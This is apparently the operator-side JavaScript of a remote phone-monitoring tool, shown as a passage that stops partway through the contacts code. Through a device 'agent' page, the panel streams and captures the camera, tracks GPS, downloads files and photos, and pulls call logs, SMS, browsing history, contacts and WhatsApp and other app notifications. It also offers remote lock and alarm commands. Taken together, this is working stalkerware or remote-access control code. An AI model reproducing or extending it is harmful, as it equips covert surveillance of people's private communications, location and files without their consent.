// ============================================
// MY DEVICE CONTROL PANEL - Main App
// ============================================

const socket = io();
let devices = [];
let capturedPhotos = [];
let currentFilePath = '/';
let cameraActive = false;
let gpsActive = false;

// ---- Navigation ----
function navigateTo(page) {
  document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));

  const pageEl = document.getElementById('page-' + page);
  const navEl = document.querySelector(`.nav-item[data-page="${page}"]`);

  if (pageEl) pageEl.classList.add('active');
  if (navEl) navEl.classList.add('active');

  // Close sidebar on mobile
  document.getElementById('sidebar').classList.remove('open');
}

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

// ---- Toast Notifications ----
function showToast(message, type) {
  type = type || 'info';
  const container = document.getElementById('toastContainer');
  const toast = document.createElement('div');
  toast.className = 'toast ' + type;
  const icons = { success: '✅', error: '❌', info: 'ℹ️' };
  toast.innerHTML = '<span>' + (icons[type] || '') + '</span><span>' + message + '</span>';
  container.appendChild(toast);
  setTimeout(function() {
    toast.style.opacity = '0';
    setTimeout(function() { toast.remove(); }, 300);
  }, 3000);
}

// ---- Device Management ----
function fetchDevices() {
  fetch('/api/devices')
    .then(function(r) { return r.json(); })
    .then(function(data) {
      devices = data;
      updateDashboard();
      updateDeviceSelects();
    });
}

function updateDashboard() {
  var total = devices.length;
  var online = devices.filter(function(d) { return d.online; }).length;
  var batteries = devices.filter(function(d) { return d.battery && d.battery.level !== null; });
  var avgBatt = batteries.length > 0
    ? Math.round(batteries.reduce(function(s, d) { return s + d.battery.level * 100; }, 0) / batteries.length)
    : '--';

  document.getElementById('totalDevices').textContent = total;
  document.getElementById('onlineDevices').textContent = online;
  document.getElementById('deviceCount').textContent = total;
  document.getElementById('activeFeatures').textContent = (cameraActive ? 1 : 0) + (gpsActive ? 1 : 0);
  document.getElementById('avgBattery').textContent = avgBatt !== '--' ? avgBatt + '%' : '--';

  var grid = document.getElementById('devicesGrid');

  if (total === 0) {
    grid.innerHTML =
      '<div class="empty-state" id="noDevices">' +
        '<div class="icon">📱</div>' +
        '<h3>No Devices Connected</h3>' +
        '<p>Open the agent page on your device to connect it to the control panel</p>' +
        '<button class="btn btn-primary" onclick="navigateTo(\'connect\')" style="margin-top:12px">Connect a Device</button>' +
      '</div>';
    return;
  }

  grid.innerHTML = '';

  devices.forEach(function(device) {
    var typeIcon = '📱';
    if (device.type === 'tablet') typeIcon = '📟';
    if (device.type === 'desktop') typeIcon = '🖥️';
    if (device.type === 'laptop') typeIcon = '💻';

    var battText = device.battery && device.battery.level !== null
      ? Math.round(device.battery.level * 100) + '%'
      : '--';
    var netText = device.network && device.network.effectiveType
      ? device.network.effectiveType
      : '--';

    var card = document.createElement('div');
    card.className = 'device-card';
    card.onclick = function() { showDeviceActions(device.id); };
    card.innerHTML =
      '<div class="status-dot ' + (device.online ? 'online' : 'offline') + '"></div>' +
      '<div class="device-icon">' + typeIcon + '</div>' +
      '<h3>' + escapeHtml(device.name) + '</h3>' +
      '<div class="device-type">' + escapeHtml(device.platform) + ' - ' + escapeHtml(device.type) + '</div>' +
      '<div class="device-meta">' +
        '<span>🔋 ' + battText + '</span>' +
        '<span>📡 ' + netText + '</span>' +
        '<span>' + (device.online ? '🟢 Online' : '⚫ Offline') + '</span>' +
      '</div>';
    grid.appendChild(card);
  });
}

function showDeviceActions(deviceId) {
  navigateTo('info');
  var sel = document.getElementById('infoDeviceSelect');
  sel.value = deviceId;
  onInfoDeviceChange();
}

function updateDeviceSelects() {
  var selects = ['cameraDeviceSelect', 'gpsDeviceSelect', 'galleryDeviceSelect',
                 'filesDeviceSelect', 'calllogDeviceSelect', 'smsDeviceSelect',
                 'historyDeviceSelect', 'notificationsDeviceSelect', 'contactsDeviceSelect',
                 'recordingsDeviceSelect', 'whatsappDeviceSelect',
                 'infoDeviceSelect', 'emergencyDeviceSelect'];

  selects.forEach(function(selId) {
    var sel = document.getElementById(selId);
    var current = sel.value;
    var firstOpt = sel.options[0];
    sel.innerHTML = '';
    sel.appendChild(firstOpt);

    devices.forEach(function(d) {
      var opt = document.createElement('option');
      opt.value = d.id;
      opt.textContent = d.name + (d.online ? ' (Online)' : ' (Offline)');
      opt.disabled = !d.online;
      sel.appendChild(opt);
    });

    if (current) sel.value = current;
  });

  // Update connect page device list
  var connectList = document.getElementById('connectDevicesList');
  if (connectList) {
    if (devices.length === 0) {
      connectList.innerHTML = '<div class="empty-state" style="padding:20px"><p>No devices connected yet</p></div>';
    } else {
      connectList.innerHTML = '';
      devices.forEach(function(d) {
        var item = document.createElement('div');
        item.className = 'file-item';
        item.innerHTML =
          '<div class="file-icon">' + (d.online ? '🟢' : '⚫') + '</div>' +
          '<div class="file-info">' +
            '<div class="file-name">' + escapeHtml(d.name) + '</div>' +
            '<div class="file-meta">' + d.platform + ' | Last seen: ' + new Date(d.lastSeen).toLocaleString() + '</div>' +
          '</div>';
        connectList.appendChild(item);
      });
    }
  }
}

// ---- Camera ----
function getSelectedCameraDevice() {
  return document.getElementById('cameraDeviceSelect').value;
}

function startCamera() {
  var deviceId = getSelectedCameraDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:camera:start', { deviceId: deviceId });
  cameraActive = true;
  showToast('Starting camera...', 'info');
}

function stopCamera() {
  var deviceId = getSelectedCameraDevice();
  if (!deviceId) return;
  socket.emit('command:camera:stop', { deviceId: deviceId });
  cameraActive = false;
  document.getElementById('cameraFeed').style.display = 'none';
  document.getElementById('cameraPlaceholder').style.display = '';
  showToast('Camera stopped', 'info');
}

function switchCamera() {
  var deviceId = getSelectedCameraDevice();
  if (!deviceId) return;
  socket.emit('command:camera:switch', { deviceId: deviceId });
  showToast('Switching camera...', 'info');
}

function capturePhoto() {
  var deviceId = getSelectedCameraDevice();
  if (!deviceId) return;
  socket.emit('command:camera:capture', { deviceId: deviceId });
  showToast('Capturing photo...', 'info');
}

function onCameraDeviceChange() {
  stopCamera();
}

socket.on('camera:frame', function(data) {
  var feed = document.getElementById('cameraFeed');
  var placeholder = document.getElementById('cameraPlaceholder');
  feed.src = data.frame;
  feed.style.display = '';
  placeholder.style.display = 'none';
});

socket.on('camera:captured', function(data) {
  capturedPhotos.unshift(data.image);
  updateCapturedPhotos();
  showToast('Photo captured!', 'success');
});

function updateCapturedPhotos() {
  var container = document.getElementById('capturedPhotos');
  if (capturedPhotos.length === 0) {
    container.innerHTML = '<div class="empty-state" style="padding:20px"><p>No photos captured yet</p></div>';
    return;
  }
  container.innerHTML = '';
  capturedPhotos.forEach(function(photo, idx) {
    var div = document.createElement('div');
    div.className = 'captured-photo';
    div.onclick = function() { openLightbox(photo); };
    div.innerHTML = '<img src="' + photo + '" alt="Photo ' + (idx + 1) + '">';
    container.appendChild(div);
  });
}

// ---- GPS ----
function getSelectedGpsDevice() {
  return document.getElementById('gpsDeviceSelect').value;
}

function startGPS() {
  var deviceId = getSelectedGpsDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:gps:start', { deviceId: deviceId });
  gpsActive = true;
  showToast('Starting GPS tracking...', 'info');
}

function stopGPS() {
  var deviceId = getSelectedGpsDevice();
  if (!deviceId) return;
  socket.emit('command:gps:stop', { deviceId: deviceId });
  gpsActive = false;
  showToast('GPS tracking stopped', 'info');
}

function onGpsDeviceChange() {
  stopGPS();
}

socket.on('gps:location', function(data) {
  document.getElementById('gpsLat').textContent = data.latitude ? data.latitude.toFixed(6) : '--';
  document.getElementById('gpsLng').textContent = data.longitude ? data.longitude.toFixed(6) : '--';
  document.getElementById('gpsAccuracy').textContent = data.accuracy ? Math.round(data.accuracy) + 'm' : '--';

  if (data.latitude && data.longitude) {
    var mapContainer = document.getElementById('mapContainer');
    mapContainer.innerHTML = '<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=' +
      (data.longitude - 0.01) + '%2C' + (data.latitude - 0.01) + '%2C' +
      (data.longitude + 0.01) + '%2C' + (data.latitude + 0.01) +
      '&layer=mapnik&marker=' + data.latitude + '%2C' + data.longitude +
      '" style="width:100%;height:100%;border:none"></iframe>';
  }
});

// ---- File Manager ----
function getSelectedFilesDevice() {
  return document.getElementById('filesDeviceSelect').value;
}

function browseFiles(path) {
  var deviceId = getSelectedFilesDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  currentFilePath = path || '/';
  socket.emit('command:files:list', { deviceId: deviceId, path: currentFilePath });
  updateBreadcrumb();
}

function onFilesDeviceChange() {
  currentFilePath = '/';
  browseFiles('/');
}

function updateBreadcrumb() {
  var bc = document.getElementById('fileBreadcrumb');
  var parts = currentFilePath.split('/').filter(Boolean);
  var html = '<span onclick="browseFiles(\'/\')">🏠 Root</span>';
  var path = '';
  parts.forEach(function(part) {
    path += '/' + part;
    var p = path;
    html += '<span class="separator">/</span><span onclick="browseFiles(\'' + escapeHtml(p) + '\')">' + escapeHtml(part) + '</span>';
  });
  bc.innerHTML = html;
}

function downloadFile(filePath) {
  var deviceId = getSelectedFilesDevice();
  if (!deviceId) return;
  socket.emit('command:files:download', { deviceId: deviceId, filePath: filePath });
  showToast('Requesting file...', 'info');
}

socket.on('files:list', function(data) {
  var list = document.getElementById('fileList');
  if (!data.files || data.files.length === 0) {
    list.innerHTML = '<div class="empty-state" style="padding:30px"><p>This folder is empty</p></div>';
    return;
  }

  list.innerHTML = '';
  // Sort: folders first
  var files = data.files.sort(function(a, b) {
    if (a.isDirectory && !b.isDirectory) return -1;
    if (!a.isDirectory && b.isDirectory) return 1;
    return a.name.localeCompare(b.name);
  });

  files.forEach(function(file) {
    var icon = file.isDirectory ? '📁' : getFileIcon(file.name);
    var item = document.createElement('div');
    item.className = 'file-item';

    if (file.isDirectory) {
      item.onclick = function() { browseFiles(file.path); };
    }

    var sizeText = file.isDirectory ? '--' : formatFileSize(file.size || 0);

    item.innerHTML =
      '<div class="file-icon">' + icon + '</div>' +
      '<div class="file-info">' +
        '<div class="file-name">' + escapeHtml(file.name) + '</div>' +
        '<div class="file-meta">' + sizeText + '</div>' +
      '</div>' +
      (!file.isDirectory ?
        '<div class="file-actions">' +
          '<button class="btn-icon" title="Download" data-filepath="' + escapeHtml(file.path) + '">⬇️</button>' +
        '</div>' : '');
    list.appendChild(item);

    // Add download event
    var dlBtn = item.querySelector('[data-filepath]');
    if (dlBtn) {
      dlBtn.onclick = function(e) {
        e.stopPropagation();
        downloadFile(file.path);
      };
    }
  });
});

socket.on('files:content', function(data) {
  if (data.content && data.fileName) {
    var a = document.createElement('a');
    a.href = data.content;
    a.download = data.fileName;
    a.click();
    showToast('File downloaded: ' + data.fileName, 'success');
  }
});

function getFileIcon(name) {
  var ext = name.split('.').pop().toLowerCase();
  var icons = {
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', webp: '🖼️', svg: '🖼️',
    mp4: '🎬', mkv: '🎬', avi: '🎬', mov: '🎬', webm: '🎬',
    mp3: '🎵', wav: '🎵', ogg: '🎵', flac: '🎵', aac: '🎵',
    pdf: '📄', doc: '📝', docx: '📝', txt: '📝', md: '📝',
    xls: '📊', xlsx: '📊', csv: '📊',
    zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
    apk: '📲', exe: '💿', dmg: '💿',
    js: '📜', py: '📜', html: '📜', css: '📜', json: '📜'
  };
  return icons[ext] || '📄';
}

function formatFileSize(bytes) {
  if (bytes === 0) return '0 B';
  var sizes = ['B', 'KB', 'MB', 'GB'];
  var i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ---- Gallery ----
let galleryPhotos = [];

function getSelectedGalleryDevice() {
  return document.getElementById('galleryDeviceSelect').value;
}

function onGalleryDeviceChange() {
  galleryPhotos = [];
  updateGalleryGrid();
}

function scanGallery() {
  var deviceId = getSelectedGalleryDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:gallery:scan', { deviceId: deviceId });
  showToast('Scanning for photos...', 'info');
  document.getElementById('galleryCount').textContent = 'Scanning...';
}

function scanGalleryFromPicker() {
  // Fallback for devices without File System Access API
  var input = document.createElement('input');
  input.type = 'file';
  input.multiple = true;
  input.accept = 'image/*';
  input.onchange = function() {
    var files = Array.from(input.files);
    galleryPhotos = [];
    var loaded = 0;

    files.forEach(function(file, idx) {
      var reader = new FileReader();
      reader.onload = function() {
        galleryPhotos.push({
          id: idx,
          name: file.name,
          size: file.size,
          type: file.type,
          lastModified: file.lastModified,
          thumbnail: reader.result
        });
        loaded++;
        if (loaded === files.length) {
          updateGalleryGrid();
          document.getElementById('galleryCount').textContent = galleryPhotos.length + ' photos found';
          showToast(galleryPhotos.length + ' photos loaded', 'success');
        }
      };
      reader.readAsDataURL(file);
    });
  };
  input.click();
}

socket.on('gallery:photos', function(data) {
  if (data.photos && data.photos.length > 0) {
    galleryPhotos = data.photos;
    updateGalleryGrid();
    var countText = galleryPhotos.length + ' photos';
    if (data.partial && data.total) {
      countText += ' (loading... ' + data.total + ' total)';
    } else if (data.total) {
      countText = galleryPhotos.length + ' / ' + data.total + ' photos loaded';
    }
    document.getElementById('galleryCount').textContent = countText;
    if (!data.partial) {
      showToast(galleryPhotos.length + ' photos found!', 'success');
    }
  } else if (data.useFilePicker) {
    showToast('Use "Pick from Device" button instead', 'info');
    document.getElementById('galleryCount').textContent = '';
  } else {
    galleryPhotos = [];
    updateGalleryGrid();
    document.getElementById('galleryCount').textContent = 'No photos found';
    showToast(data.note || 'No photos found', 'info');
  }
});

socket.on('gallery:photo', function(data) {
  if (data.content) {
    openLightbox(data.content);
    // Also allow download
    var a = document.createElement('a');
    a.href = data.content;
    a.download = data.name || 'photo.jpg';
    // Don't auto-download, just show in lightbox
  }
});

function updateGalleryGrid() {
  var grid = document.getElementById('galleryGrid');
  if (galleryPhotos.length === 0) {
    grid.innerHTML =
      '<div class="empty-state" style="padding:60px 20px">' +
        '<div class="icon">🖼️</div>' +
        '<h3>No Photos</h3>' +
        '<p>Select a device and scan to browse photos</p>' +
        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device select karein aur "Scan Photos" click karein</p>' +
      '</div>';
    return;
  }

  grid.innerHTML = '';
  galleryPhotos.forEach(function(photo) {
    var item = document.createElement('div');
    item.className = 'gallery-item';
    item.onclick = function() { viewFullPhoto(photo); };

    var date = photo.lastModified ? new Date(photo.lastModified).toLocaleDateString() : '';
    var size = photo.size ? formatFileSize(photo.size) : '';

    item.innerHTML =
      '<div class="gallery-thumb">' +
        '<img src="' + photo.thumbnail + '" alt="' + escapeHtml(photo.name) + '" loading="lazy">' +
      '</div>' +
      '<div class="gallery-info">' +
        '<div class="gallery-name">' + escapeHtml(photo.name) + '</div>' +
        '<div class="gallery-meta">' + size + (date ? ' | ' + date : '') + '</div>' +
      '</div>' +
      '<div class="gallery-actions">' +
        '<button class="btn-icon" title="View Full Size" onclick="event.stopPropagation(); viewFullPhoto(' + JSON.stringify(photo).replace(/"/g, '&quot;') + ')">🔍</button>' +
        '<button class="btn-icon" title="Download" onclick="event.stopPropagation(); downloadGalleryPhoto(' + photo.id + ', \'' + escapeHtml(photo.name) + '\')">⬇️</button>' +
      '</div>';
    grid.appendChild(item);
  });
}

function viewFullPhoto(photo) {
  if (photo.thumbnail) {
    // Show thumbnail immediately, then request full size
    openLightbox(photo.thumbnail);
  }
  var deviceId = getSelectedGalleryDevice();
  if (deviceId && photo.id !== undefined) {
    socket.emit('command:gallery:get', { deviceId: deviceId, photoId: photo.id });
  }
}

function downloadGalleryPhoto(photoId, fileName) {
  var deviceId = getSelectedGalleryDevice();
  if (!deviceId) return;

  // Request full-size photo for download
  var handler = function(data) {
    if (data.photoId === photoId && data.content) {
      var a = document.createElement('a');
      a.href = data.content;
      a.download = fileName || 'photo.jpg';
      a.click();
      showToast('Downloaded: ' + fileName, 'success');
      socket.off('gallery:photo', handler);
    }
  };
  socket.on('gallery:photo', handler);
  socket.emit('command:gallery:get', { deviceId: deviceId, photoId: photoId });
  showToast('Downloading...', 'info');
}

// ---- Call Log ----
let callLogData = [];

function getSelectedCalllogDevice() {
  return document.getElementById('calllogDeviceSelect').value;
}

function onCalllogDeviceChange() {
  callLogData = [];
  updateCallLogList();
}

function fetchCallLog() {
  var deviceId = getSelectedCalllogDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:calllog:fetch', { deviceId: deviceId });
  showToast('Fetching call log...', 'info');
}

socket.on('calllog:data', function(data) {
  if (data.calls && data.calls.length > 0) {
    callLogData = data.calls;
    updateCallLogList();
    document.getElementById('calllogCount').textContent = callLogData.length + ' calls';
    showToast(callLogData.length + ' calls found', 'success');
  } else {
    callLogData = [];
    updateCallLogList();
    document.getElementById('calllogCount').textContent = data.note || 'No calls found';
    if (data.note) showToast(data.note, 'info');
  }
});

socket.on('notification:new', function(data) {
  if (data.type === 'call') {
    showToast('New call detected: ' + (data.title || data.body), 'info');
    callLogData.unshift({
      number: data.body || data.title,
      type: 'incoming',
      timestamp: data.timestamp,
      duration: '--'
    });
    updateCallLogList();
    document.getElementById('calllogCount').textContent = callLogData.length + ' calls';
  } else if (data.type === 'sms') {
    showToast('New SMS: ' + (data.title || ''), 'info');
    smsData.unshift({
      from: data.title || 'Unknown',
      body: data.body || '',
      timestamp: data.timestamp,
      read: false
    });
    updateSmsList();
    document.getElementById('smsCount').textContent = smsData.length + ' messages';
  }
});

function updateCallLogList() {
  var list = document.getElementById('callLogList');
  if (callLogData.length === 0) {
    list.innerHTML =
      '<div class="empty-state" style="padding:60px 20px">' +
        '<div class="icon">📞</div>' +
        '<h3>No Call Log</h3>' +
        '<p>Calls will appear here when notifications are received</p>' +
        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>' +
      '</div>';
    return;
  }

  list.innerHTML = '';
  callLogData.forEach(function(call) {
    var item = document.createElement('div');
    item.className = 'log-item';
    var icon = call.type === 'incoming' ? '📲' : call.type === 'outgoing' ? '📱' : '📵';
    var time = call.timestamp ? new Date(call.timestamp).toLocaleString() : '--';
    item.innerHTML =
      '<div class="log-icon">' + icon + '</div>' +
      '<div class="log-info">' +
        '<div class="log-title">' + escapeHtml(call.number || 'Unknown') + '</div>' +
        '<div class="log-meta">' + escapeHtml(call.type || 'call') + ' | ' + time + '</div>' +
      '</div>' +
      '<div class="log-duration">' + (call.duration || '--') + '</div>';
    list.appendChild(item);
  });
}

// ---- SMS ----
let smsData = [];

function getSelectedSmsDevice() {
  return document.getElementById('smsDeviceSelect').value;
}

function onSmsDeviceChange() {
  smsData = [];
  updateSmsList();
}

function fetchSms() {
  var deviceId = getSelectedSmsDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:sms:fetch', { deviceId: deviceId });
  showToast('Fetching SMS...', 'info');
}

socket.on('sms:data', function(data) {
  if (data.messages && data.messages.length > 0) {
    smsData = data.messages;
    updateSmsList();
    document.getElementById('smsCount').textContent = smsData.length + ' messages';
    showToast(smsData.length + ' messages found', 'success');
  } else {
    smsData = [];
    updateSmsList();
    document.getElementById('smsCount').textContent = data.note || 'No messages found';
    if (data.note) showToast(data.note, 'info');
  }
});

function updateSmsList() {
  var list = document.getElementById('smsList');
  if (smsData.length === 0) {
    list.innerHTML =
      '<div class="empty-state" style="padding:60px 20px">' +
        '<div class="icon">💬</div>' +
        '<h3>No SMS Messages</h3>' +
        '<p>SMS will appear here when notifications are received</p>' +
        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Device par notification access allow karna padega</p>' +
      '</div>';
    return;
  }

  list.innerHTML = '';
  smsData.forEach(function(msg) {
    var item = document.createElement('div');
    item.className = 'log-item sms-item';
    var time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : '--';
    item.innerHTML =
      '<div class="log-icon">💬</div>' +
      '<div class="log-info">' +
        '<div class="log-title">' + escapeHtml(msg.from || 'Unknown') + '</div>' +
        '<div class="log-body">' + escapeHtml(msg.body || '') + '</div>' +
        '<div class="log-meta">' + time + '</div>' +
      '</div>';
    list.appendChild(item);
  });
}

// ---- Browser History ----
let historyData = [];

function getSelectedHistoryDevice() {
  return document.getElementById('historyDeviceSelect').value;
}

function onHistoryDeviceChange() {
  historyData = [];
  updateHistoryList();
}

function fetchHistory() {
  var deviceId = getSelectedHistoryDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:history:fetch', { deviceId: deviceId });
  showToast('Fetching history...', 'info');
}

function clearHistoryList() {
  historyData = [];
  updateHistoryList();
  document.getElementById('historyCount').textContent = '';
}

socket.on('history:data', function(data) {
  if (data.history && data.history.length > 0) {
    historyData = data.history;
    updateHistoryList();
    document.getElementById('historyCount').textContent = historyData.length + ' entries';
    showToast(historyData.length + ' history entries', 'success');
  } else {
    historyData = [];
    updateHistoryList();
    document.getElementById('historyCount').textContent = 'No history yet';
    showToast('No browsing history yet', 'info');
  }
});

function updateHistoryList() {
  var list = document.getElementById('historyList');
  if (historyData.length === 0) {
    list.innerHTML =
      '<div class="empty-state" style="padding:60px 20px">' +
        '<div class="icon">🕐</div>' +
        '<h3>No History</h3>' +
        '<p>Browsing activity will be tracked while agent is connected</p>' +
        '<p style="font-size:13px;color:var(--text-muted);margin-top:8px">Agent page open hone ke baad ki activity track hogi</p>' +
      '</div>';
    return;
  }

  list.innerHTML = '';
  // Show in reverse chronological order
  var sorted = historyData.slice().sort(function(a, b) { return b.timestamp - a.timestamp; });
  sorted.forEach(function(entry) {
    var item = document.createElement('div');
    item.className = 'log-item';
    var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '--';
    var icon = '🌐';
    if (entry.type === 'navigation') icon = '🔗';
    if (entry.type === 'pushState') icon = '➡️';

    item.innerHTML =
      '<div class="log-icon">' + icon + '</div>' +
      '<div class="log-info">' +
        '<div class="log-title">' + escapeHtml(entry.title || entry.url || 'Unknown') + '</div>' +
        '<div class="log-meta">' + escapeHtml(entry.url || '') + '</div>' +
        '<div class="log-meta">' + time + ' | ' + (entry.type || '') + '</div>' +
      '</div>';
    list.appendChild(item);
  });
}

// ---- Device Info ----
function onInfoDeviceChange() {
  var deviceId = document.getElementById('infoDeviceSelect').value;
  if (!deviceId) return;

  var device = devices.find(function(d) { return d.id === deviceId; });
  if (!device) return;

  document.getElementById('infoName').textContent = device.name;
  document.getElementById('infoType').textContent = device.type;
  document.getElementById('infoPlatform').textContent = device.platform;
  document.getElementById('infoBrowser').textContent = device.browser;
  document.getElementById('infoScreen').textContent =
    device.screenWidth + ' x ' + device.screenHeight;

  if (device.battery) {
    var level = Math.round(device.battery.level * 100);
    document.getElementById('infoBatteryLevel').textContent = level + '%';
    document.getElementById('infoBatteryCharging').textContent =
      device.battery.charging ? 'Yes ⚡' : 'No';
    document.getElementById('batteryBar').style.width = level + '%';
    document.getElementById('batteryBar').className = 'fill ' +
      (level > 50 ? 'green' : level > 20 ? 'yellow' : 'red');
  }

  if (device.network) {
    document.getElementById('infoNetType').textContent =
      device.network.effectiveType || '--';
    document.getElementById('infoNetDown').textContent =
      device.network.downlink ? device.network.downlink + ' Mbps' : '--';
    document.getElementById('infoNetRTT').textContent =
      device.network.rtt ? device.network.rtt + ' ms' : '--';
    document.getElementById('infoNetOnline').textContent =
      navigator.onLine ? 'Yes' : 'No';
  }

  if (device.storage) {
    document.getElementById('infoStorageUsed').textContent =
      formatFileSize(device.storage.used || 0);
    document.getElementById('infoStorageTotal').textContent =
      formatFileSize(device.storage.total || 0);
    var pct = device.storage.total > 0
      ? Math.round((device.storage.used / device.storage.total) * 100)
      : 0;
    document.getElementById('storageBar').style.width = pct + '%';
  }
}

// ---- Emergency ----
function triggerAlarm() {
  var deviceId = document.getElementById('emergencyDeviceSelect').value;
  if (!deviceId) { showToast('Please select a device', 'error'); return; }
  socket.emit('command:emergency:alarm', { deviceId: deviceId });
  showToast('Alarm triggered on device!', 'success');
}

function triggerLock() {
  var deviceId = document.getElementById('emergencyDeviceSelect').value;
  if (!deviceId) { showToast('Please select a device', 'error'); return; }
  socket.emit('command:emergency:lock', { deviceId: deviceId });
  showToast('Lock command sent!', 'success');
}

function showMessageModal() {
  document.getElementById('messageModal').classList.add('active');
}

function closeMessageModal() {
  document.getElementById('messageModal').classList.remove('active');
}

function sendEmergencyMessage() {
  var deviceId = document.getElementById('emergencyDeviceSelect').value;
  var msg = document.getElementById('emergencyMessage').value;
  if (!deviceId) { showToast('Please select a device', 'error'); return; }
  if (!msg.trim()) { showToast('Please enter a message', 'error'); return; }
  socket.emit('command:emergency:message', { deviceId: deviceId, message: msg });
  closeMessageModal();
  document.getElementById('emergencyMessage').value = '';
  showToast('Message sent to device!', 'success');
}

var _emergencySnapshotHandler = null;

function emergencyCapture() {
  var deviceId = document.getElementById('emergencyDeviceSelect').value;
  if (!deviceId) { showToast('Please select a device', 'error'); return; }
  socket.emit('command:camera:capture', { deviceId: deviceId });
  showToast('Taking snapshot...', 'info');

  if (_emergencySnapshotHandler) {
    socket.off('camera:captured', _emergencySnapshotHandler);
  }

  _emergencySnapshotHandler = function(data) {
    var container = document.getElementById('emergencySnapshot');
    container.innerHTML = '<img src="' + data.image + '" style="max-width:100%;border-radius:12px;margin-top:8px" alt="Snapshot">';
    socket.off('camera:captured', _emergencySnapshotHandler);
    _emergencySnapshotHandler = null;
  };
  socket.on('camera:captured', _emergencySnapshotHandler);
}

// ---- Lightbox ----
function openLightbox(src) {
  document.getElementById('lightboxImg').src = src;
  document.getElementById('lightbox').classList.add('active');
}

function closeLightbox() {
  document.getElementById('lightbox').classList.remove('active');
}

// ---- Connect Device Page ----
function setupAgentUrl() {
  var url = window.location.origin + '/agent';
  document.getElementById('agentUrl').textContent = url;
  generateQR(url);
}

function copyAgentUrl() {
  var url = window.location.origin + '/agent';
  navigator.clipboard.writeText(url).then(function() {
    showToast('URL copied!', 'success');
  });
}

function generateQR(url) {
  var container = document.getElementById('qrCanvas');
  if (!container) return;
  container.innerHTML = '';
  if (typeof QRCode !== 'undefined') {
    new QRCode(container, {
      text: url,
      width: 200,
      height: 200,
      colorDark: '#3b82f6',
      colorLight: '#1a2235',
      correctLevel: QRCode.CorrectLevel.M
    });
  }
}

// ---- Utilities ----
function escapeHtml(text) {
  if (!text) return '';
  var div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ============ NOTIFICATIONS ============
let notificationsData = [];

function getSelectedNotificationsDevice() {
  return document.getElementById('notificationsDeviceSelect').value;
}
function onNotificationsDeviceChange() {
  notificationsData = [];
  updateNotificationsList();
}
function fetchNotifications() {
  var deviceId = getSelectedNotificationsDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:notifications:fetch', { deviceId: deviceId });
  showToast('Fetching notifications...', 'info');
}

socket.on('notifications:data', function(data) {
  if (data.notifications && data.notifications.length > 0) {
    notificationsData = data.notifications;
    updateNotificationsList();
    document.getElementById('notifCount').textContent = notificationsData.length + ' notifications';
    showToast(notificationsData.length + ' notifications found', 'success');
  } else {
    document.getElementById('notifCount').textContent = '';
    var note = data.note || 'No notifications captured yet';
    document.getElementById('notificationsList').innerHTML =
      '<div class="empty-state" style="padding:40px 20px"><div class="icon">🔔</div><h3>No Notifications</h3><p>' + note + '</p></div>';
  }
});

// Real-time notification
socket.on('notification:new', function(data) {
  notificationsData.unshift(data);
  updateNotificationsList();
  showToast('New notification: ' + (data.appName || data.packageName) + ' - ' + data.title, 'info');
});

function updateNotificationsList() {
  var list = document.getElementById('notificationsList');
  if (notificationsData.length === 0) {
    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">🔔</div><h3>No Notifications</h3><p>Enable Notification Access on device</p></div>';
    return;
  }
  list.innerHTML = '';
  notificationsData.forEach(function(notif) {
    var item = document.createElement('div');
    item.className = 'log-item';
    var icon = '🔔';
    if (notif.category === 'whatsapp') icon = '💬';
    else if (notif.category === 'call') icon = '📞';
    else if (notif.category === 'sms') icon = '💬';
    else if (notif.category === 'instagram') icon = '📷';
    else if (notif.category === 'telegram') icon = '✈️';

    var time = notif.timestamp ? new Date(notif.timestamp).toLocaleString() : '--';
    item.innerHTML = '<div class="log-icon">' + icon + '</div>' +
      '<div class="log-info"><div class="log-title">' + escapeHtml(notif.appName || notif.packageName || '') + '</div>' +
      '<div class="log-body"><strong>' + escapeHtml(notif.title || '') + '</strong> ' + escapeHtml(notif.text || '') + '</div>' +
      '<div class="log-meta">' + time + '</div></div>';
    list.appendChild(item);
  });
}

// ============ CONTACTS ============
let contactsData = [];

function getSelectedContactsDevice() {
  return document.getElementById('contactsDeviceSelect').value;
}
function onContactsDeviceChange() {
  contactsData = [];
  updateContactsList();
}
function fetchContacts() {
  var deviceId = getSelectedContactsDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:contacts:fetch', { deviceId: deviceId });
  showToast('Fetching contacts...', 'info');
}

socket.on('contacts:data', function(data) {
  if (data.contacts && data.contacts.length > 0) {
    contactsData = data.contacts;
    updateContactsList();
    document.getElementById('contactsCount').textContent = contactsData.length + ' contacts';
    showToast(contactsData.length + ' contacts found', 'success');
  } else {
    document.getElementById('contactsCount').textContent = '';
    document.getElementById('contactsList').innerHTML =
      '<div class="empty-state" style="padding:40px 20px"><div class="icon">👥</div><h3>No Contacts</h3><p>Contacts permission needed</p></div>';
  }
});

function updateContactsList() {
  var list = document.getElementById('contactsList');
  if (contactsData.length === 0) {
    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">👥</div><h3>No Contacts</h3><p>Select device and fetch</p></div>';
    return;
  }
  list.innerHTML = '';
  contactsData.forEach(function(contact) {
